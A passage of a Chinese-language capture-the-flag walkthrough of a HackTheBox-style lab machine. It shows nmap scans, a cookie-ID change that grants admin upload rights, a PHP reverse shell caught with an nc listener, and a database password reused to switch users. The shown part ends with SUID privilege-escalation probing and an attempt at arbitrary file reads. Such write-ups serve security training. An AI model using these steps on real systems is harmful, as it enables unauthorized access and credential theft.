10.129.95.191<br>Host is up (0.0036s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)<br>|   256 241da417d4e32a9c905c30588f60778d (ECDSA)<br>|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Welcome<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.18 seconds<br><br></code></pre></td></tr></table></figure><p>可以判断出的内容：Ubuntu 系统、Apache 搭建，开放了 22 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 10.129.95.191<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-02 22:25 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.95.191<br>Host is up (0.0033s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure:</span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 32.10 seconds</span><br></code></pre></td></tr></table></figure><h3 id="Web-渗透-1"><a href="#Web-渗透-1" class="headerlink" title="Web 渗透"></a>Web 渗透</h3><p>nmap 自带的漏扫没什么有价值的信息，看一看浏览器端吧</p><p><img src="/pic/7d1a9d8bf06ab1095cb4b52a5cdca331_MD5.png"></p><p>翻了翻似乎没什么有效的点击按钮，F12 看看</p><p><img src="/pic/8fd251c6d5a109ceafd8efd6e7f954c5_MD5.png"></p><p>似乎看到了登录的地址</p><p><img src="/pic/8aa2743c4b37494548ff02ef7dc05543_MD5.png"></p><p>Wappalyzer 的结果显示这是 php 搭建的页面（在源码中也能看到），没有后台管理的产品名称，不过有个游客登陆的选项，点进去看看</p><p><img src="/pic/ba19f350b7c36e411877fe19c62ba443_MD5.png"></p><h3 id="修改cookies"><a href="#修改cookies" class="headerlink" title="修改cookies"></a>修改cookies</h3><p>进入之后发现了 uploads 选项，那就尝试点进去吧。上传界面提示仅限 super admin 才有操作权限</p><p><img src="/pic/8362415ba532e5c956f13260a488d665_MD5.png"></p><p>看一眼控制台，原来它是靠 cookies 来判断游客和管理员的，点击账户发现，看到了如下内容</p><p><img src="/pic/54e0d9a59f4bf89922bdbf83ccb262da_MD5.png"></p><p>这里观察 URL 发现：id&#x3D;2，那我们肯定要试试直接修改 URL，会有什么样的结果</p><p><img src="/pic/885356170ad324ddeb542fc447677315_MD5.png"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>拿到了管理员的 id，那我们直接修改 cookie 试试看，修改后应该可以直接访问上传文件的界面</p><p><img src="/pic/64b23ae0563a137afaa9db04c87c3353_MD5.png"></p><p>确实可以上传文件了，我们直接使用 php reverse shell，修改其中的 ip，那接下来的问题是，上传文件后怎么访问，也就是上传后的文件路径，目录爆破一下吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://10.129.95.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.129.95.191<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/02 22:50:31 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/images               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/images/]<br>/themes               (Status: 301) [Size: 315] [--&gt; http://10.129.95.191/themes/]<br>/uploads              (Status: 301) [Size: 316] [--&gt; http://10.129.95.191/uploads/]<br>/css                  (Status: 301) [Size: 312] [--&gt; http://10.129.95.191/css/]<br>/js                   (Status: 301) [Size: 311] [--&gt; http://10.129.95.191/js/]<br>/fonts                (Status: 301) [Size: 314] [--&gt; http://10.129.95.191/fonts/]<br>/server-status        (Status: 403) [Size: 278]<br>Progress: 220289 / 220561 (99.88%)<br>===============================================================<br>2023/06/02 22:52:02 Finished<br>===============================================================<br><br></code></pre></td></tr></table></figure><p>目录爆破直接就有 uploads，我们尝试访问 uploads，提示 <code>Directory listing not allowed here.</code> 虽然不能展示目录，但是我们上传的文件大概率传输到了这个目录下，尝试开启监听后，访问目标文件，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>listening on [any] 1234 ...<br><br>connect to [10.10.14.109] from (UNKNOWN) [10.129.95.191] 36364<br>Linux oopsie 4.15.0-76-generic <span class="hljs-comment">#86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br> 02:57:08 up 44 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.04, 0.02<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ $ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">/bin/sh: 2: python: not found</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@oopsie:/$ whoami</span><br><span class="hljs-string">whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">www-data@oopsie:/$ uname -a</span><br><span class="hljs-string">uname -a</span><br><span class="hljs-string">Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">www-data@oopsie:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br><span class="hljs-string">www-data@oopsie:/$</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>接下来考虑如何提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin<br>syslog:x:102:106::/home/syslog:/usr/sbin/nologin<br>messagebus:x:103:107::/nonexistent:/usr/sbin/nologin<br>_apt:x:104:65534::/nonexistent:/usr/sbin/nologin<br>lxd:x:105:65534::/var/lib/lxd/:/bin/false<br>uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin<br>dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:109:1::/var/cache/pollinate:/bin/false<br>sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br>robert:x:1000:1000:robert:/home/robert:/bin/bash<br>mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false<br>robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><p>passwd 文件和定时任务没有收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/11420/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/11420/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/11420/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/11420/bin/su<br>      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/11420/bin/umount<br>     2618     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/11420/usr/bin/chfn<br>     2620     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/11420/usr/bin/chsh<br>     2697     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/11420/usr/bin/gpasswd<br>     2789     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/11420/usr/bin/newgrp<br>     2802     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/11420/usr/bin/passwd<br>     2912    134 -rwsr-xr-x   1 root     root       136808 Jan 20  2021 /snap/core/11420/usr/bin/sudo<br>     3011     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3383    419 -rwsr-xr-x   1 root     root              428240 Jun  7  2021 /snap/core/11420/usr/lib/openssh/ssh-keysign<br>     6457    109 -rwsr-xr-x   1 root     root              111080 Jul 14  2021 /snap/core/11420/usr/lib/snapd/snap-confine<br>     7638    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/11420/usr/sbin/pppd<br>       66     40 -rwsr-xr-x   1 root     root               40152 Jan 27  2020 /snap/core/11743/bin/mount<br>       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/11743/bin/ping<br>       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/11743/bin/ping6<br>       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/11743/bin/su<br>      116     27 -rwsr-xr-x   1 root     root               27608 Jan 27  2020 /snap/core/11743/bin/umount<br>     2618     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/11743/usr/bin/chfn<br>     2620     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/11743/usr/bin/chsh<br>     2697     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/11743/usr/bin/gpasswd<br>     2789     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/11743/usr/bin/newgrp<br>     2802     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/11743/usr/bin/passwd<br>     2912    134 -rwsr-xr-x   1 root     root              136808 Jan 20  2021 /snap/core/11743/usr/bin/sudo<br>     3011     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     3383    419 -rwsr-xr-x   1 root     root              428240 Jun  7  2021 /snap/core/11743/usr/lib/openssh/ssh-keysign<br>     6457    109 -rwsr-xr-x   1 root     root              111080 Aug 27  2021 /snap/core/11743/usr/lib/snapd/snap-confine<br>     7638    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/11743/usr/sbin/pppd<br>    26836     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount<br>    26889     28 -rwsr-xr-x   1 root     root               26696 Aug 22  2019 /bin/umount<br>    26845     44 -rwsr-xr-x   1 root     root               43088 Aug 22  2019 /bin/mount<br>    26887     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping<br>    26903     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su<br>   264784     44 -rwsr-xr--   1 root     messagebus         42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   264653    108 -rwsr-sr-x   1 root     root              109432 Oct 30  2019 /usr/lib/snapd/snap-confine<br>   264974    428 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br>   264791     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   264978     16 -rwsr-xr-x   1 root     root               14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   396049    100 -rwsr-xr-x   1 root     root              100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>   264421     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newuidmap<br>   264437     60 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /usr/bin/passwd<br>   264164     52 -rwsr-sr-x   1 daemon   daemon             51464 Feb 20  2018 /usr/bin/at<br>   264151     12 -rwsr-xr--   1 root     bugtracker          8792 Jan 25  2020 /usr/bin/bugtracker<br>   264420     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /usr/bin/newgrp<br>   264457     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2019 /usr/bin/pkexec<br>   264215     76 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /usr/bin/chfn<br>   264217     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /usr/bin/chsh<br>   264598     20 -rwsr-xr-x   1 root     root               18448 Jun 28  2019 /usr/bin/traceroute6.iputils<br>   264419     40 -rwsr-xr-x   1 root     root               37136 Mar 22  2019 /usr/bin/newgidmap<br>   264310     76 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /usr/bin/gpasswd<br>   262535    148 -rwsr-xr-x   1 root     root              149080 Jan 19  2021 /usr/bin/sudo<br><br></code></pre></td></tr></table></figure><p>s 权限的文件很多，但是真正有效的却几乎没有，不过有个特殊的文件 bugtracker，似乎不是系统文件，去看看吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ <span class="hljs-built_in">ls</span> -liah /usr/bin/bugtracker<br><span class="hljs-built_in">ls</span> -liah /usr/bin/bugtracker<br>264151 -rwsr-xr-- 1 root bugtracker 8.6K Jan 25  2020 /usr/bin/bugtracker<br>www-data@oopsie:/$ file /usr/bin/bugtracker<br>file /usr/bin/bugtracker<br>/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="hljs-keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped<br><br></code></pre></td></tr></table></figure><p>是个可执行文件，尝试运行一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br>bash: /usr/bin/bugtracker: Permission denied<br>www-data@oopsie:/$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@oopsie:/tmp$ /usr/bin/bugtracker<br>/usr/bin/bugtracker<br>bash: /usr/bin/bugtracker: Permission denied<br></code></pre></td></tr></table></figure><p>没有权限执行……那就继续信息收集吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>cdn-cgi  css  fonts  images  index.php  js  themes  uploads<br></code></pre></td></tr></table></figure><p>有个 cdn-cgi 目录进去看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html/cdn-cgi$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>58427 drwxr-xr-x 3 root root 4.0K Jul 28  2021 .<br>58146 drwxr-xr-x 9 root root 4.0K Jul 28  2021 ..<br>58428 drwxr-xr-x 2 root root 4.0K Jul 28  2021 login<br>www-data@oopsie:/var/www/html/cdn-cgi$ <span class="hljs-built_in">cd</span> login<br><span class="hljs-built_in">cd</span> login<br>www-data@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 28K<br>58428 drwxr-xr-x 2 root root 4.0K Jul 28  2021 .<br>58427 drwxr-xr-x 3 root root 4.0K Jul 28  2021 ..<br>58430 -rw-r--r-- 1 root root 6.3K Apr 15  2021 admin.php<br>58432 -rw-r--r-- 1 root root   80 Jan 24  2020 db.php<br>58429 -rw-r--r-- 1 root root 5.3K Apr 15  2021 index.php<br>58431 -rw-r--r-- 1 root root    0 Jan 24  2020 script.js<br>www-data@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cat</span> db.php<br><span class="hljs-built_in">cat</span> db.php<br>&lt;?php<br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="横向移动切换用户"><a href="#横向移动切换用户" class="headerlink" title="横向移动切换用户"></a>横向移动切换用户</h4><p>得到了数据库的用户名和密码，不过这个用户名似乎在 passwd 中也有，我们尝试使用 su 命令来切换用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert<br>su robert<br>Password: M3g4C0rpUs3r!<br><br>robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>robert<br>robert@oopsie:/var/www/html/cdn-cgi/login$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> robert: M3g4C0rpUs3r!<br><br>Sorry, user robert may not run sudo on oopsie.<br></code></pre></td></tr></table></figure><p>接下来我们就要回到之前那个没有权限运行文件中，看看这次是否能运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/var/www/html/cdn-cgi/login$ <span class="hljs-built_in">cd</span> /usr/bin<br><span class="hljs-built_in">cd</span> /usr/bin<br>robert@oopsie:/usr/bin$ bugtracker<br>bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 1<br>1<br>---------------<br><br>Binary package hint: ev-engine-lib<br><br>Version: 3.3.3-1<br><br>Reproduce:<br>When loading library <span class="hljs-keyword">in</span> firmware it seems to be crashed<br><br>What you expected to happen:<br>Synchronized browsing to be enabled since it is enabled <span class="hljs-keyword">for</span> that site.<br><br>What happened instead:<br>Synchronized browsing is disabled. Even choosing VIEW &gt; SYNCHRONIZED BROWSING from menu does not stay enabled between connects.<br></code></pre></td></tr></table></figure><p>感觉像是输入一个漏洞的 id，就会获得对应的描述</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">robert@oopsie:/usr/bin$ ^[[A<br>bugtracker<br><br>------------------<br>: EV Bug Tracker :<br>------------------<br><br>Provide Bug ID: 11<br>11<br>---------------<br><br><span class="hljs-built_in">cat</span>: /root/reports/11: No such file or directory<br><br></code></pre></td></tr></table></figure><p>这次尝试输入一个较大的数字，发现提示 cat 没有读取到对应的文件，这里可以尝试一下存不存在本地任意文件读取</p><figure class="highlight bash"><table><tr><td 